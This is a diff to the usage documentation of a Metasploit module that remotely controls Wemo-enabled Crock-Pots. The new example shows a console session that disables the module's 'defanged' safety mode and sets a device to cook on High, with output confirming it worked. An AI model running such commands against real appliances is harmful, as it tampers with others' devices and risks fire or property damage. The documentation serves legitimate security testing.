@@ -39,14 +39,22 @@ functionality. Set this only if you're SURE you want to proceed.
 ## Usage
 
 ```
-msf5 auxiliary(admin/wemo/crockpot) > set rhosts [redacted]
-rhosts => [redacted]
-msf5 auxiliary(admin/wemo/crockpot) > set action Stop
-action => Stop
+msf5 > use auxiliary/admin/wemo/crockpot
+msf5 auxiliary(admin/wemo/crockpot) > set rhosts 10.22.22.1
+rhosts => 10.22.22.1
+msf5 auxiliary(admin/wemo/crockpot) > set temp High
+temp => High
+msf5 auxiliary(admin/wemo/crockpot) > set time 1
+time => 1
+msf5 auxiliary(admin/wemo/crockpot) > set defangedmode false
+defangedmode => false
+msf5 auxiliary(admin/wemo/crockpot) > set verbose true
+verbose => true
 msf5 auxiliary(admin/wemo/crockpot) > run
 
-[*] Setting temperature to Off and cook time to 0s
-[+] Cook time set to 0s
+[+] Wemo-enabled Crock-Pot detected
+[*] Cooking on High for 1m
+[+] Cook time set to 1m
 [*] Auxiliary module execution completed
 msf5 auxiliary(admin/wemo/crockpot) >
 ```
